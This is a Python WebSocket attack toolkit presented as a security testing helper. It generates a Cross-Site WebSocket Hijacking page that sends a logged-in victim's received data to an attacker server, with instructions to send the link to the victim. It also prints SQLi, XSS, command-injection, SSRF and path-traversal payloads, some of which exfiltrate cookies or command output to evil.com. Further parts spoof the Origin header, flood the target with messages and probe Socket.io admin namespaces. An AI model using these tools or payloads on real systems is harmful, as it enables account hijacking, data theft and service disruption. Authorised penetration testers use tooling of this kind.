#!/usr/bin/env python3
"""
websocket_helper.py — WebSocket Security Testing Helper

Usage:
    python3 websocket_helper.py cswsh-poc wss://target.com/ws
    python3 websocket_helper.py payloads
    python3 websocket_helper.py handshake wss://target.com/ws
    python3 websocket_helper.py flood wss://target.com/ws TOKEN 100
    python3 websocket_helper.py socketio https://target.com
"""
import sys, base64, hashlib, socket, ssl, json, struct, urllib.parse, threading, time

# ── CSWSH PoC generator ───────────────────────────────────────────────────────

def cswsh_poc(ws_url):
    print(f"\n[+] CSWSH PoC for: {ws_url}\n")
    html = f"""<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h1>Cross-Site WebSocket Hijacking PoC</h1>
<p>Victim must be logged into target.com for this to work.</p>
<pre id="output"></pre>
<script>
// Browser automatically sends cookies when WS is opened
// Origin header will be this page's origin (evil.com)
var ws = new WebSocket("{ws_url}");
var output = document.getElementById("output");

ws.onopen = function() {{
    output.textContent += "[*] Connected! (cookies were sent automatically)\\n";
    
    // Try common actions to exfiltrate data
    var actions = [
        {{"action":"get_profile"}},
        {{"action":"get_messages"}},
        {{"action":"get_payment_methods"}},
        {{"action":"list_users"}},
        {{"type":"subscribe","channel":"user_events"}},
        {{"cmd":"whoami"}},
    ];
    
    actions.forEach(function(a) {{
        ws.send(JSON.stringify(a));
        output.textContent += "[>] Sent: " + JSON.stringify(a) + "\\n";
    }});
}};

ws.onmessage = function(event) {{
    output.textContent += "[<] Received: " + event.data + "\\n";
    
    // Exfiltrate all received data to attacker server
    fetch("https://YOUR-ATTACKER-SERVER/steal", {{
        method: "POST",
        headers: {{"Content-Type": "application/json"}},
        body: JSON.stringify({{
            "url": "{ws_url}",
            "data": event.data,
            "timestamp": new Date().toISOString()
        }})
    }});
}};

ws.onerror = function(e) {{
    output.textContent += "[!] Error (Origin check may be in place): " + e.type + "\\n";
}};

ws.onclose = function(c) {{
    output.textContent += "[*] Closed. Code=" + c.code + " Reason=" + c.reason + "\\n";
}};
</script>
</body>
</html>"""
    fname = "cswsh_poc.html"
    with open(fname, "w") as f:
        f.write(html)
    print(f"  Saved to: {fname}")
    print(f"  Host on attacker server and send URL to victim")
    print(f"  Replace YOUR-ATTACKER-SERVER with your server URL")
    print()
    print("  Manual Origin test (Burp):")
    print("  Intercept WS handshake → change Origin header to https://evil.com")
    print("  If server returns 101 Switching Protocols → Origin not validated → CSWSH possible\n")

# ── Injection Payloads ────────────────────────────────────────────────────────

WS_PAYLOADS = {
    "SQLi": [
        '{"action":"search","query":"test\' OR 1=1--"}',
        '{"action":"get_user","id":"1 UNION SELECT password FROM users--"}',
        '{"action":"login","user":"admin\'--","pass":"x"}',
    ],
    "XSS": [
        '{"action":"send_message","content":"<script>alert(1)</script>"}',
        '{"action":"set_name","name":"<img src=x onerror=alert(document.cookie)>"}',
        '{"action":"comment","text":"<svg onload=fetch(\'https://evil.com/?c=\'+document.cookie)>"}',
    ],
    "Command Injection": [
        '{"action":"ping","host":"127.0.0.1; id"}',
        '{"action":"nslookup","domain":"target.com | id"}',
        '{"action":"export","filename":"report; curl http://evil.com/$(id|base64)"}',
    ],
    "SSRF": [
        '{"action":"fetch","url":"http://169.254.169.254/latest/meta-data/"}',
        '{"action":"webhook","url":"http://127.0.0.1/admin"}',
        '{"action":"import","source":"http://internal-service/"}',
    ],
    "Path Traversal": [
        '{"action":"read_file","path":"../../etc/passwd"}',
        '{"action":"load_config","file":"../../../app/.env"}',
    ],
    "IDOR": [
        '{"action":"get_messages","user_id":1338}',
        '{"action":"get_profile","id":1}',
        '{"action":"delete_account","user_id":1338}',
    ],
    "Mass Assignment": [
        '{"action":"update_profile","name":"test","role":"admin","is_admin":true}',
        '{"action":"register","email":"x@x.com","password":"test","is_admin":true,"balance":99999}',
    ],
    "Auth Bypass": [
        '{"type":"auth","token":""}',
        '{"type":"auth","token":null}',
        '{"type":"subscribe","channel":"admin_events"}',
    ],
}

def show_payloads():
    print("\n[+] WebSocket Injection Payloads\n")
    for category, payloads in WS_PAYLOADS.items():
        print(f"  === {category} ===")
        for p in payloads:
            print(f"  {p}")
        print()
    print("  wscat usage:")
    print("  npm install -g wscat")
    print("  wscat -c 'wss://target.com/ws' -H 'Authorization: Bearer TOKEN'")
    print("  > {paste payload here}\n")

# ── Raw Handshake Tester ──────────────────────────────────────────────────────

def build_ws_handshake(host, path, origin=None, token=None, protocol=None):
    key = base64.b64encode(b'websocket test key').decode()
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "Upgrade: websocket",
        "Connection: Upgrade",
        f"Sec-WebSocket-Key: {key}",
        "Sec-WebSocket-Version: 13",
    ]
    if origin:
        lines.append(f"Origin: {origin}")
    if token:
        lines.append(f"Authorization: Bearer {token}")
    if protocol:
        lines.append(f"Sec-WebSocket-Protocol: {protocol}")
    lines += ["", ""]
    return "\r\n".join(lines).encode()

def test_handshake(ws_url):
    parsed = urllib.parse.urlparse(ws_url)
    host   = parsed.netloc
    path   = parsed.path or "/"
    use_ssl = ws_url.startswith("wss://")
    port   = 443 if use_ssl else 80
    if ":" in host:
        host, port = host.rsplit(":",1)
        port = int(port)

    print(f"\n[+] WebSocket Handshake Tests: {ws_url}\n")
    test_origins = [
        None,
        "https://evil.com",
        "null",
        f"https://evil.{host}",
        f"https://{host}.evil.com",
    ]

    for origin in test_origins:
        label = origin or "(no Origin header)"
        try:
            sock = socket.create_connection((host, port), timeout=5)
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            handshake = build_ws_handshake(host, path, origin=origin)
            sock.sendall(handshake)
            resp = sock.recv(1024).decode("utf-8","ignore")
            sock.close()
            if "101" in resp:
                print(f"  [!!!] ACCEPTED  Origin={label}")
            elif "403" in resp:
                print(f"  [OK]  REJECTED  Origin={label}  (403)")
            else:
                first_line = resp.split("\r\n")[0]
                print(f"  [ ]   {first_line}  Origin={label}")
        except Exception as e:
            print(f"  [ERR] Origin={label}  error={e}")
    print()

# ── Message Flood ─────────────────────────────────────────────────────────────

def flood(ws_url, token, count):
    try:
        import websocket as ws_lib
    except ImportError:
        print("[!] Install websocket-client: pip install websocket-client")
        print("    Then retry.")
        # Fallback: show manual command
        print(f"\n  Manual flood with wscat:")
        print(f"  for i in $(seq 1 {count}); do")
        print(f"    echo '{{\"action\":\"ping\"}}' | wscat -c '{ws_url}' -H 'Authorization: Bearer {token}' &")
        print(f"  done")
        return

    print(f"\n[+] WebSocket Message Flood: {count} messages to {ws_url}\n")
    results = {"sent": 0, "errors": 0}
    lock = threading.Lock()

    def send_messages():
        try:
            ws = ws_lib.create_connection(
                ws_url,
                header=[f"Authorization: Bearer {token}"],
                timeout=10
            )
            large_payload = json.dumps({"action":"search","query":"A"*10000})
            for _ in range(count // 10):
                ws.send(large_payload)
                with lock:
                    results["sent"] += 1
            ws.close()
        except Exception as e:
            with lock:
                results["errors"] += 1

    threads = [threading.Thread(target=send_messages) for _ in range(10)]
    start = time.time()
    for t in threads: t.start()
    for t in threads: t.join()
    elapsed = time.time() - start

    print(f"  Sent    : {results['sent'] * 10} messages")
    print(f"  Errors  : {results['errors']}")
    print(f"  Duration: {elapsed:.1f}s\n")

# ── Socket.io Recon ───────────────────────────────────────────────────────────

def socketio_recon(base_url):
    base_url = base_url.rstrip("/")
    print(f"\n[+] Socket.io Recon: {base_url}\n")
    import urllib.request

    # Check polling endpoint
    poll_url = f"{base_url}/socket.io/?EIO=4&transport=polling"
    try:
        req = urllib.request.Request(poll_url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read(500).decode("utf-8","ignore")
            print(f"  [!] Socket.io polling endpoint accessible!")
            print(f"      {poll_url}")
            print(f"      Response: {body[:200]}\n")
    except Exception as e:
        print(f"  Socket.io polling: {e}\n")

    print("  Browser console PoC (paste while on target site):\n")
    print("""  const socket = io();
  socket.onAny((event, ...args) => {
      console.log('[WS Event]', event, args);
  });
  // Try admin namespace:
  const adminSock = io('/admin');
  adminSock.on('connect', () => console.log('[*] Admin namespace connected!'));
  // Try privileged events:
  socket.emit('admin:list_users', {}, (r) => console.log(r));
  socket.emit('get_all_data', {admin:true}, (r) => console.log(r));
""")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    if cmd == "cswsh-poc":
        cswsh_poc(args[1] if len(args)>1 else "wss://target.com/ws")
    elif cmd == "payloads":
        show_payloads()
    elif cmd == "handshake":
        test_handshake(args[1] if len(args)>1 else "wss://target.com/ws")
    elif cmd == "flood":
        url   = args[1] if len(args)>1 else "wss://target.com/ws"
        token = args[2] if len(args)>2 else "YOUR-TOKEN"
        count = int(args[3]) if len(args)>3 else 100
        flood(url, token, count)
    elif cmd == "socketio":
        socketio_recon(args[1] if len(args)>1 else "https://target.com")
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
